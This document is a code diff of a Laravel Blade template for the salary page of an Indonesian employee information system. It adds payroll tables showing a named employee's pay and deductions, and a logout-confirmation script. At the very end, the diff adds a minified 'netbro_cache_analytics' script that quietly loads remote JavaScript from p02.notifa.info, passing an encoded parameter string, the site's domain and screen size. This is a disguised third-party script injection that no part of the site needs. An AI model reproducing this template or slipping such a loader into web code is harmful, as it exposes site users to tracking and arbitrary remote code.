@@ -8,18 +8,23 @@
     <meta name="description" content="">
     <meta name="author" content="">
     <link rel="shortcut icon" href="/image/favicon.png">
-    <title>Beranda</title>
+    <title>Gaji</title>
     <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
     <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
     <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
     <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
     <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
     <link rel="stylesheet" href="assets/css/style.css" type="text/css"/>
+        
     </head>
     <body>
-    <div class="be-wrapper">
-     <div class="be-wrapper be-fixed-sidebar">
+      <div class="be-wrapper">
+       <div class="be-wrapper be-fixed-sidebar">
 
             <!--  Sidebar Brand Logo -->
 
@@ -41,7 +46,7 @@
 
                     <div class="profil">
                         <div class="circular--portrait">
-                            <img class="img-responsive" src="assets/img/avatar.png">
+                            <img class="img-responsive foto-karyawan" src="/image/FotoProfil/{{Auth::user()->foto_profil}}">
                             <div id="username">
                                 <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                             </div>
@@ -134,26 +139,120 @@
                </div>
             </div>
          </div>
-       </div>
     
 
        <!--   Content Start  -->
-      <div class="be-wrapper be-fixed-sidebar">
-        <div class="be-content be-icons-list">
-          <div class="main-content container-fluid">
-            <div class="row">
-            <!-- <div class="col-xs-12 col-md-6 col-lg-3"> -->
-                <div class="welcome">
-                 <p>Gaji</p>
-                 <a href="#">{{ Auth::user()->name }}</a> 
-                </div>  
-            <!-- </div>  -->         
+            
+      <div class="be-content">
+         <h3 class="page-header"><i class="fa fa-money-bill-alt"></i><span>Gaji</span></h3>
+        
+        <div class="main-content container-fluid">
+          <div class="row">
+
+           <!--Basic Elements-->
+            <div class="col-md-12">
+              <div class="panel panel-default panel-border-color panel-border-color-primary">
+                <div class="panel-body">
+                  <div class="user-info-list panel panel-default">
+                  <div class="panel-heading panel-heading-divider">
+                     <table class="no-border no-strip skills">
+                      <tbody class="no-border-x no-border-y">
+                        <tr>
+                          <td class="icon"><span class="mdi mdi-account-circle"></span></td>
+                          <td class="item">Nama<span class="icon s7-portfolio"></span></td>
+                          <td>Adinda Virguinia Ayu Permata Manihuruk</td>
+                        </tr>
+                        <tr>
+                          <td class="icon"><span class="mdi mdi-case"></span></td>
+                          <td class="item">Jabatan<span class="icon s7-portfolio"></span></td>
+                          <td>Developer Engineer</td>
+                        </tr>
+                      </tbody>
+                    </table >
+                  </div>
+                  <div class="panel-body">
+                    <br>
+                   <b>Pendapatan</b>
+                   <table class="no-border no-strip skills">
+                      <tbody class="no-border-x no-border-y">
+                        <tr>
+                          <td class="item">Gaji Pokok<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 3,200,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Tunjangan Profesi<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 2,700,000 </td>
+                        </tr>
+                        <tr>
+                          <td class="item">Tunjangan Jabatan<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 3,200,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Tunjangan Kinerja<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 2,700,000 </td>
+                        </tr>
+                        <tr>
+                          <td class="item">Tunjangan Khusus<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 3,200,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Tunjangan Transportasi<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 2,700,000 </td>
+                        </tr>
+                        <tr>
+                          <td class="item">Insentif<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 3,200,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Asuransi (BPJS)<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 2,700,000 </td>
+                        </tr>
+                        <tr>
+                          <td class="item">Total A<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 3,200,000</td>
+                        </tr>
+                      </tbody>
+                    </table >
+                    <br><b>Potongan</b>
+                     <table class="no-border no-strip skills">
+                      <tbody class="no-border-x no-border-y">
+                        <tr>
+                          <td class="item">PPH21<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 140,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Disisentif<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 152,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">BPJS (Kesehatan dan Ketenagakerjaan)<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 320,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Lain-lain<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 20,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item">Total B<span class="icon s7-portfolio"></span></td>
+                          <td>Rp 500,000</td>
+                        </tr>
+                        <tr>
+                          <td class="item"><b>Total (A-B)</b><span class="icon s7-portfolio"></span></td>
+                          <td>Rp 7,500,000</td>
+                        </tr>
+                      </tbody>
+                    </table >
+                  </div>
+                </div>
+              </div>        
+                </div>
+              </div>
             </div>
           </div>
-        </div>
-      </div>
+          </div>
+       
         
-       <!--   Content End  -->
+<!--   Content End  -->
        
 <!--Footer -->
      
@@ -162,7 +261,7 @@
         <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
       </div>
     </div>
-
+</div>
  
 <!--  Inisialisasi Java Script -->
 
@@ -183,33 +282,31 @@
 
 I<!-- inisialisasi Java Script -->
 
-<script type = "text/javascript">
-    if (self == top) {
-        function netbro_cache_analytics(fn, callback) {
-            setTimeout(function() {
-                fn();
-                callback();
-            }, 0);
+<script type="text/javascript">
+
+// Fungsi Logout
+
+$(function(){
+    $('a#logout').click(function(){
+        if(confirm('Apakah anda yakin ingin keluar ?')) {
+            return true;
         }
 
-        function sync(fn) {
-            fn();
-        }
+        return false;
+          });
+      });
 
-        function requestCfs() {
-            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-            var idc_glo_r = Math.floor(Math.random() * 99999999999);
-            var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-            var bsa = document.createElement('script');
-            bsa.type = 'text/javascript';
-            bsa.async = true;
-            bsa.src = url;
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-        }
-        netbro_cache_analytics(requestCfs, function() {});
-    };
 
+// Fungsi Menu dashboard
+
+$(document).ready(function(){
+
+    App.init();
+    App.dashboard();
+
+    });
 </script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
 </script>
 </body>
 </html>
